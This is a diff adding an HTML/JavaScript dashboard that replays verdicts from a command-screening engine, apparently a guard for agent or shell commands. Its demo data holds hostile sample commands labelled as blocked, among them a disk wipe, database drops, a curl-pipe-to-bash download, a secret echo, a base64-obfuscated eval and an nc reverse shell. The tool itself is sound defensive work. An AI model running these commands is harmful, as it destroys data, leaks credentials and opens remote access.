@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TEOS Sentinel — Forensic Replay</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#020509;--bg2:#060d16;--bg3:#0a1520;--panel:#0c1926;--panel2:#102030;
+  --border:rgba(0,200,255,0.06);--border2:rgba(0,200,255,0.14);--border3:rgba(0,200,255,0.28);
+  --cyan:#00c8ff;--green:#00ff88;--red:#ff3d57;--amber:#ffb020;--purple:#9d6fff;--white:#c8dfe8;
+  --muted:rgba(200,223,232,0.45);--muted2:rgba(200,223,232,0.2);
+  --mono:'JetBrains Mono','Courier New',monospace;--sans:'Inter',sans-serif;
+}
+html,body{height:100%;background:var(--bg);color:var(--white);font-family:var(--sans);font-size:13px;overflow-x:hidden}
+body::after{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,200,255,0.006) 2px,rgba(0,200,255,0.006) 4px);pointer-events:none;z-index:9999}
+
+#topbar{height:48px;background:var(--bg2);border-bottom:1px solid var(--border2);display:flex;align-items:center;padding:0 20px;gap:16px;position:sticky;top:0;z-index:100}
+.topbar-logo{display:flex;align-items:center;gap:8px;font-family:var(--mono);font-size:12px;font-weight:700;color:var(--cyan);letter-spacing:0.06em;text-decoration:none}
+.topbar-logo span{width:24px;height:24px;background:linear-gradient(135deg,var(--cyan),var(--purple));border-radius:5px;display:flex;align-items:center;justify-content:center;font-size:11px}
+.topbar-sep{width:1px;height:20px;background:var(--border2)}
+.topbar-title{font-size:13px;font-weight:600;letter-spacing:-0.01em}
+.topbar-title small{color:var(--muted);font-weight:400;font-size:11px;margin-left:8px}
+.topbar-right{margin-left:auto;display:flex;align-items:center;gap:10px}
+.topbar-time{font-family:var(--mono);font-size:11px;color:var(--muted2);letter-spacing:0.06em}
+
+/* CONTROLS BAR */
+#controls{padding:16px 20px;background:var(--bg2);border-bottom:1px solid var(--border);display:flex;align-items:center;gap:12px;flex-wrap:wrap}
+.ctrl-group{display:flex;align-items:center;gap:6px}
+.ctrl-label{font-family:var(--mono);font-size:10px;color:var(--muted2);letter-spacing:0.08em;text-transform:uppercase}
+.ctrl-select{font-family:var(--mono);font-size:11px;background:var(--panel);color:var(--white);border:1px solid var(--border2);border-radius:4px;padding:4px 8px;outline:none;cursor:pointer}
+.ctrl-select:focus{border-color:var(--border3)}
+.btn{font-family:var(--mono);font-size:11px;padding:5px 14px;border-radius:4px;cursor:pointer;border:1px solid;transition:all 0.15s;display:inline-flex;align-items:center;gap:6px;letter-spacing:0.03em}
+.btn-cyan{background:rgba(0,200,255,0.12);color:var(--cyan);border-color:var(--border2)}
+.btn-cyan:hover{background:rgba(0,200,255,0.2);border-color:var(--border3)}
+.btn-ghost{background:transparent;color:var(--muted);border-color:var(--border)}
+.btn-ghost:hover{color:var(--white);border-color:var(--border2)}
+.btn-red{background:rgba(255,61,87,0.1);color:var(--red);border-color:rgba(255,61,87,0.25)}
+.btn-red:hover{background:rgba(255,61,87,0.16)}
+.btn-green{background:rgba(0,255,136,0.1);color:var(--green);border-color:rgba(0,255,136,0.25)}
+.btn-green:hover{background:rgba(0,255,136,0.16)}
+.ctrl-right{margin-left:auto;display:flex;gap:8px;align-items:center}
+.speed-ctrl{font-family:var(--mono);font-size:11px;color:var(--muted2);display:flex;align-items:center;gap:4px}
+
+/* TIMELINE */
+#timeline-bar{padding:12px 20px;background:var(--bg2);border-bottom:1px solid var(--border);position:sticky;top:48px;z-index:90}
+.timeline-track{position:relative;height:32px;background:var(--bg3);border-radius:4px;overflow:hidden;cursor:pointer;margin-bottom:6px}
+.timeline-progress{height:100%;background:linear-gradient(90deg,rgba(0,200,255,0.3),rgba(0,200,255,0.1));transition:width 0.1s linear;pointer-events:none}
+.timeline-markers{position:absolute;inset:0;display:flex;align-items:center}
+.timeline-marker{position:absolute;width:2px;height:100%;opacity:0.5}
+.timeline-marker.block{background:var(--red)}
+.timeline-marker.warn{background:var(--amber)}
+.timeline-marker.allow{background:var(--green)}
+.timeline-info{display:flex;justify-content:space-between;font-family:var(--mono);font-size:10px;color:var(--muted2)}
+
+/* PLAYBACK DISPLAY */
+#playback{padding:20px;min-height:200px;display:flex;flex-direction:column;gap:16px}
+.playback-empty{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:60px;color:var(--muted2);font-family:var(--mono);font-size:12px;gap:12px}
+.playback-event{border:1px solid var(--border2);border-radius:8px;overflow:hidden;max-width:800px}
+.playback-header{padding:12px 16px;display:flex;align-items:center;justify-content:space-between}
+.playback-header.block{background:rgba(255,61,87,0.06)}
+.playback-header.warn{background:rgba(255,176,32,0.06)}
+.playback-header.allow{background:rgba(0,255,136,0.04)}
+.playback-verdict{font-family:var(--mono);font-size:14px;font-weight:700;letter-spacing:0.04em}
+.playback-header.block .playback-verdict{color:var(--red)}
+.playback-header.warn .playback-verdict{color:var(--amber)}
+.playback-header.allow .playback-verdict{color:var(--green)}
+.playback-score{font-family:var(--mono);font-size:24px;font-weight:700}
+.playback-header.block .playback-score{color:var(--red)}
+.playback-header.warn .playback-score{color:var(--amber)}
+.playback-header.allow .playback-score{color:var(--green)}
+.playback-body{padding:16px;background:var(--panel)}
+.playback-row{display:flex;gap:12px;font-family:var(--mono);font-size:12px;margin-bottom:6px}
+.playback-key{color:var(--muted2);min-width:90px}
+.playback-val{color:var(--white)}
+.playback-val.cmd{word-break:break-all;background:var(--bg3);padding:8px 12px;border-radius:4px;margin-top:4px;font-size:11px;line-height:1.6}
+.playback-reasons{padding:12px 16px;background:var(--bg2);border-top:1px solid var(--border);font-family:var(--mono);font-size:11px}
+.playback-reason{display:flex;gap:8px;padding:3px 0;color:var(--muted)}
+.playback-reason::before{content:'\2192';color:var(--cyan);flex-shrink:0}
+
+/* EVENT LIST */
+#event-list{padding:0 20px 20px}
+.event-list-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px}
+.event-list-header h3{font-size:14px;font-weight:700;letter-spacing:-0.02em}
+.event-list-header span{font-family:var(--mono);font-size:11px;color:var(--muted2)}
+#event-cards{display:flex;flex-direction:column;gap:4px;max-width:800px}
+.evt-card{display:grid;grid-template-columns:60px 52px 1fr 60px;gap:10px;align-items:center;padding:8px 12px;border-radius:4px;border:1px solid transparent;cursor:pointer;transition:all 0.12s;font-family:var(--mono);font-size:11px}
+.evt-card:hover{border-color:var(--border2);background:var(--panel)}
+.evt-card.active{border-color:var(--border3);background:var(--panel2)}
+.evt-card.block{border-left:2px solid var(--red);background:rgba(255,61,87,0.03)}
+.evt-card.warn{border-left:2px solid var(--amber);background:rgba(255,176,32,0.03)}
+.evt-card.allow{border-left:2px solid var(--green);background:rgba(0,255,136,0.02)}
+.evt-time{color:var(--muted2);font-size:10px}
+.evt-verdict{font-size:9px;font-weight:700;padding:2px 6px;border-radius:2px;text-align:center;letter-spacing:0.06em}
+.v-block{background:rgba(255,61,87,0.1);color:var(--red);border:1px solid rgba(255,61,87,0.3)}
+.v-warn{background:rgba(255,176,32,0.1);color:var(--amber);border:1px solid rgba(255,176,32,0.3)}
+.v-allow{background:rgba(0,255,136,0.08);color:var(--green);border:1px solid rgba(0,255,136,0.2)}
+.evt-cmd{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:var(--white)}
+.evt-score{text-align:right;font-size:10px}
+.evt-score.high{color:var(--red)}.evt-score.mid{color:var(--amber)}.evt-score.low{color:var(--green)}
+
+/* TOAST */
+#toast{position:fixed;bottom:16px;right:16px;z-index:9000;display:flex;flex-direction:column;gap:6px;pointer-events:none}
+.toast{font-family:var(--mono);font-size:11px;padding:8px 14px;border-radius:4px;border:1px solid var(--border2);background:var(--panel2);color:var(--white);animation:tin 0.2s ease;max-width:300px;box-shadow:0 4px 16px rgba(0,0,0,0.5)}
+@keyframes tin{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+
+/* LOADING */
+.loading{display:flex;align-items:center;justify-content:center;padding:40px;color:var(--muted2);font-family:var(--mono);font-size:12px;gap:10px}
+.spinner{width:16px;height:16px;border:2px solid var(--border2);border-top-color:var(--cyan);border-radius:50%;animation:spin 0.7s linear infinite;display:inline-block}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+@media(max-width:700px){#controls{flex-direction:column;align-items:flex-start}.ctrl-right{margin-left:0}}
+</style>
+</head>
+<body>
+
+<div id="topbar">
+  <a href="index.html" class="topbar-logo"><span>&#9901;</span>TEOS</a>
+  <div class="topbar-sep"></div>
+  <div class="topbar-title">Forensic Replay<small>Evidence Timeline</small></div>
+  <div class="topbar-right">
+    <div class="topbar-time" id="nav-time">--:--:--</div>
+  </div>
+</div>
+
+<div id="controls">
+  <div class="ctrl-group">
+    <span class="ctrl-label">Filter</span>
+    <select class="ctrl-select" id="filter-verdict" onchange="applyFilters()">
+      <option value="all">All Verdicts</option>
+      <option value="block">BLOCK only</option>
+      <option value="warn">WARN only</option>
+      <option value="allow">ALLOW only</option>
+    </select>
+  </div>
+  <div class="ctrl-group">
+    <span class="ctrl-label">Sort</span>
+    <select class="ctrl-select" id="sort-order" onchange="applyFilters()">
+      <option value="desc">Newest First</option>
+      <option value="asc">Oldest First</option>
+      <option value="score-desc">Highest Score</option>
+    </select>
+  </div>
+  <div class="ctrl-right">
+    <div class="speed-ctrl">
+      <span class="ctrl-label">Speed</span>
+      <select class="ctrl-select" id="play-speed">
+        <option value="2000">0.5x</option>
+        <option value="1000" selected>1x</option>
+        <option value="500">2x</option>
+        <option value="200">5x</option>
+      </select>
+    </div>
+    <button class="btn btn-green" id="btn-play" onclick="togglePlay()">&#9654; Play</button>
+    <button class="btn btn-ghost" onclick="stepForward()">&#9197; Step</button>
+    <button class="btn btn-ghost" onclick="resetReplay()">&#8634; Reset</button>
+    <button class="btn btn-cyan" onclick="loadEvents()">&#8635; Refresh</button>
+  </div>
+</div>
+
+<div id="timeline-bar">
+  <div class="timeline-track" id="timeline-track" onclick="seekTimeline(event)">
+    <div class="timeline-progress" id="timeline-progress" style="width:0%"></div>
+    <div class="timeline-markers" id="timeline-markers"></div>
+  </div>
+  <div class="timeline-info">
+    <span id="tl-start">--</span>
+    <span id="tl-position">Event 0 / 0</span>
+    <span id="tl-end">--</span>
+  </div>
+</div>
+
+<div id="playback">
+  <div class="playback-empty" id="playback-empty">
+    <span style="font-size:28px;opacity:0.3">&#9194;</span>
+    <span>Load events to begin forensic replay</span>
+    <button class="btn btn-cyan" onclick="loadEvents()">Load Events from Engine</button>
+  </div>
+</div>
+
+<div id="event-list" style="display:none">
+  <div class="event-list-header">
+    <h3>Event Sequence</h3>
+    <span id="filtered-count">0 events</span>
+  </div>
+  <div id="event-cards"></div>
+</div>
+
+<div id="toast"></div>
+
+<script>
+const API_BASE = '';
+let allEvents     = [];
+let filteredEvents= [];
+let currentIndex  = 0;
+let isPlaying     = false;
+let playTimer     = null;
+
+/* ── CLOCK ───────────────────────────────────────────────── */
+function tickClock(){document.getElementById('nav-time').textContent=new Date().toLocaleTimeString('en-GB',{hour12:false})}
+setInterval(tickClock,1000);tickClock();
+
+/* ── API ─────────────────────────────────────────────────── */
+async function apiFetch(path){try{const r=await fetch(API_BASE+path);if(!r.ok)throw new Error(r.status);return await r.json()}catch(e){return null}}
+
+async function loadEvents(){
+  const el=document.getElementById('playback');
+  el.innerHTML='<div class="loading"><span class="spinner"></span>Loading events from engine...</div>';
+  const d=await apiFetch('/events');
+  let events=[];
+  if(d&&Array.isArray(d.events)){events=d.events}
+  else if(d&&Array.isArray(d)){events=d}
+  else{
+    events=generateDemoEvents(30);
+    toast('Using demo data (engine offline)',5000);
+  }
+  allEvents=events.map((e,i)=>({...e,id:e.id||(Date.now()-i*1000),verdict:(e.verdict||'allow').toLowerCase()}));
+  applyFilters();
+  toast('Loaded '+allEvents.length+' events');
+}
+
+function generateDemoEvents(n){
+  const samples=[
+    {cmd:'rm -rf /',verdict:'block',score:100,rule:'R01.DESTRUCTIVE_SHELL',reasons:['Wiper command detected','Permanent data destruction']},
+    {cmd:'DROP DATABASE prod;',verdict:'block',score:95,rule:'R09.SQL_DESTRUCTION',reasons:['Destructive SQL command']},
+    {cmd:'curl malware.sh|bash',verdict:'block',score:95,rule:'R03.CURL_EXEC_CHAIN',reasons:['Remote code execution']},
+    {cmd:'echo $AWS_SECRET_KEY',verdict:'block',score:90,rule:'R04.SECRET_ECHO',reasons:['Secret exposure']},
+    {cmd:'chmod 777 /etc/passwd',verdict:'warn',score:75,rule:'R02.CHMOD_ESCALATION',reasons:['Privilege escalation risk']},
+    {cmd:'DROP TABLE users;',verdict:'warn',score:70,rule:'R09.SQL_DESTRUCTION',reasons:['Table destruction']},
+    {cmd:'npm install lodash',verdict:'allow',score:0,rule:'R00.CLEAN',reasons:['Clean']},
+    {cmd:'git status',verdict:'allow',score:0,rule:'R00.CLEAN',reasons:['Clean']},
+    {cmd:'eval(atob("cm0gLXJmLw"))',verdict:'block',score:88,rule:'R07.BASE64_EXEC',reasons:['Obfuscated payload']},
+    {cmd:'nc -e /bin/sh 10.0.0.1 4444',verdict:'block',score:100,rule:'R08.REVERSE_SHELL',reasons:['Reverse shell']},
+  ];
+  const now=Date.now();
+  return Array.from({length:n},(_,i)=>{
+    const s=samples[i%samples.length];
+    return{...s,timestamp:new Date(now-(n-i)*30000).toISOString(),severity:s.score>=90?'critical':s.score>=70?'high':s.score>=40?'medium':'none'};
+  });
+}
+
+/* ── FILTERS ─────────────────────────────────────────────── */
+function applyFilters(){
+  const vf=document.getElementById('filter-verdict').value;
+  const so=document.getElementById('sort-order').value;
+  let evts=[...allEvents];
+  if(vf!=='all')evts=evts.filter(e=>e.verdict===vf);
+  if(so==='desc')evts.sort((a,b)=>new Date(b.timestamp)-new Date(a.timestamp));
+  else if(so==='asc')evts.sort((a,b)=>new Date(a.timestamp)-new Date(b.timestamp));
+  else if(so==='score-desc')evts.sort((a,b)=>b.score-a.score);
+  filteredEvents=evts;
+  currentIndex=0;
+  renderTimeline();
+  renderEventList();
+  showEvent(0);
+  document.getElementById('event-list').style.display=filteredEvents.length?'block':'none';
+  document.getElementById('playback-empty').style.display=filteredEvents.length?'none':'flex';
+}
+
+/* ── TIMELINE ────────────────────────────────────────────── */
+function renderTimeline(){
+  if(filteredEvents.length===0)return;
+  const track=document.getElementById('timeline-markers');
+  track.innerHTML=filteredEvents.map((e,i)=>{
+    const pct=(i/(filteredEvents.length-1))*100;
+    return '<div class="timeline-marker '+e.verdict+'" style="left:'+pct+'%" title="'+escHtml(e.command||e.cmd||'')+'"></div>';
+  }).join('');
+  const first=new Date(filteredEvents[0].timestamp).toLocaleTimeString('en-GB',{hour12:false});
+  const last=new Date(filteredEvents[filteredEvents.length-1].timestamp).toLocaleTimeString('en-GB',{hour12:false});
+  document.getElementById('tl-start').textContent=first;
+  document.getElementById('tl-end').textContent=last;
+  updateTimelinePosition();
+}
+
+function updateTimelinePosition(){
+  const pct=filteredEvents.length>0?((currentIndex/(filteredEvents.length-1))*100):0;
+  document.getElementById('timeline-progress').style.width=Math.min(pct,100)+'%';
+  document.getElementById('tl-position').textContent='Event '+currentIndex+' / '+(filteredEvents.length-1);
+}
+
+function seekTimeline(e){
+  if(filteredEvents.length===0)return;
+  const rect=e.currentTarget.getBoundingClientRect();
+  const pct=(e.clientX-rect.left)/rect.width;
+  currentIndex=Math.round(pct*(filteredEvents.length-1));
+  currentIndex=Math.max(0,Math.min(currentIndex,filteredEvents.length-1));
+  updateTimelinePosition();
+  showEvent(currentIndex);
+  highlightCard(currentIndex);
+}
+
+/* ── PLAYBACK ────────────────────────────────────────────── */
+function showEvent(idx){
+  if(idx<0||idx>=filteredEvents.length)return;
+  const e=filteredEvents[idx];
+  const cmd=e.command||e.cmd||'?';
+  const ver=e.verdict.toUpperCase();
+  const reasons=Array.isArray(e.reasons)?e.reasons:['No details'];
+  document.getElementById('playback').innerHTML=
+    '<div class="playback-event">'+
+      '<div class="playback-header '+e.verdict+'">'+
+        '<div><div class="playback-verdict">'+ver+'</div><div style="font-family:var(--mono);font-size:10px;color:var(--muted);margin-top:4px">'+new Date(e.timestamp).toLocaleString()+'</div></div>'+
+        '<div class="playback-score">'+e.score+'<span style="font-size:12px;color:var(--muted)">/100</span></div>'+
+      '</div>'+
+      '<div class="playback-body">'+
+        '<div class="playback-row"><span class="playback-key">Command</span></div>'+
+        '<div class="playback-val cmd">'+escHtml(cmd)+'</div>'+
+        '<div class="playback-row" style="margin-top:8px"><span class="playback-key">Rule</span><span class="playback-val" style="color:var(--cyan)">'+(e.rule||'R00')+'</span></div>'+
+        '<div class="playback-row"><span class="playback-key">Severity</span><span class="playback-val">'+(e.severity||'none')+'</span></div>'+
+        '<div class="playback-row"><span class="playback-key">Score</span><span class="playback-val">'+e.score+' / 100</span></div>'+
+        '<div class="playback-row"><span class="playback-key">Engine</span><span class="playback-val">TEOS Sentinel v2.0 &middot; Deterministic</span></div>'+
+      '</div>'+
+      '<div class="playback-reasons">'+
+        '<div style="font-family:var(--mono);font-size:10px;color:var(--muted2);letter-spacing:0.1em;text-transform:uppercase;margin-bottom:6px">Reasons</div>'+
+        reasons.map(r=>'<div class="playback-reason">'+escHtml(r)+'</div>').join('')+
+      '</div>'+
+    '</div>';
+}
+
+function togglePlay(){
+  if(isPlaying){stopPlay();return}
+  if(filteredEvents.length===0)return;
+  if(currentIndex>=filteredEvents.length-1)currentIndex=0;
+  isPlaying=true;
+  const btn=document.getElementById('btn-play');
+  btn.innerHTML='&#9646;&#9646; Pause';
+  btn.className='btn btn-red';
+  const speed=parseInt(document.getElementById('play-speed').value);
+  playTimer=setInterval(()=>{
+    currentIndex++;
+    if(currentIndex>=filteredEvents.length){stopPlay();currentIndex=filteredEvents.length-1;return}
+    showEvent(currentIndex);
+    updateTimelinePosition();
+    highlightCard(currentIndex);
+  },speed);
+}
+
+function stopPlay(){
+  isPlaying=false;
+  clearInterval(playTimer);
+  const btn=document.getElementById('btn-play');
+  btn.innerHTML='&#9654; Play';
+  btn.className='btn btn-green';
+}
+
+function stepForward(){
+  if(filteredEvents.length===0)return;
+  stopPlay();
+  currentIndex=Math.min(currentIndex+1,filteredEvents.length-1);
+  showEvent(currentIndex);
+  updateTimelinePosition();
+  highlightCard(currentIndex);
+}
+
+function resetReplay(){
+  stopPlay();
+  currentIndex=0;
+  if(filteredEvents.length>0){showEvent(0);updateTimelinePosition();highlightCard(0)}
+}
+
+function highlightCard(idx){
+  document.querySelectorAll('.evt-card').forEach((c,i)=>{c.classList.toggle('active',i===idx)});
+  const card=document.querySelectorAll('.evt-card')[idx];
+  if(card)card.scrollIntoView({behavior:'smooth',block:'nearest'});
+}
+
+/* ── EVENT LIST ──────────────────────────────────────────── */
+function renderEventList(){
+  const container=document.getElementById('event-cards');
+  document.getElementById('filtered-count').textContent=filteredEvents.length+' events';
+  container.innerHTML=filteredEvents.map((e,i)=>{
+    const t=new Date(e.timestamp).toLocaleTimeString('en-GB',{hour12:false});
+    const cmd=e.command||e.cmd||'?';
+    const vc='v-'+e.verdict;
+    const sc=e.score>=80?'high':e.score>=40?'mid':'low';
+    return '<div class="evt-card '+e.verdict+(i===currentIndex?' active':'')+'" onclick="jumpTo('+i+')"><span class="evt-time">'+t+'</span><span class="evt-verdict '+vc+'">'+e.verdict.toUpperCase()+'</span><span class="evt-cmd">'+escHtml(cmd)+'</span><span class="evt-score '+sc+'">'+e.score+'</span></div>';
+  }).join('');
+}
+
+function jumpTo(idx){
+  stopPlay();
+  currentIndex=idx;
+  showEvent(idx);
+  updateTimelinePosition();
+  highlightCard(idx);
+}
+
+/* ── UTILS ───────────────────────────────────────────────── */
+function escHtml(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
+function toast(msg,dur){dur=dur||3000;const c=document.getElementById('toast');const el=document.createElement('div');el.className='toast';el.textContent=msg;c.appendChild(el);setTimeout(()=>el.remove(),dur)}
+
+/* ── KEYBOARD ────────────────────────────────────────────── */
+document.addEventListener('keydown',e=>{
+  if(e.target.tagName==='SELECT'||e.target.tagName==='INPUT')return;
+  if(e.code==='Space'){e.preventDefault();togglePlay()}
+  else if(e.code==='ArrowRight'){e.preventDefault();stepForward()}
+  else if(e.code==='ArrowLeft'){e.preventDefault();stopPlay();currentIndex=Math.max(0,currentIndex-1);showEvent(currentIndex);updateTimelinePosition();highlightCard(currentIndex)}
+  else if(e.code==='KeyR'){e.preventDefault();resetReplay()}
+});
+
+/* ── INIT ────────────────────────────────────────────────── */
+loadEvents();
+</script>
+</body>
+</html>
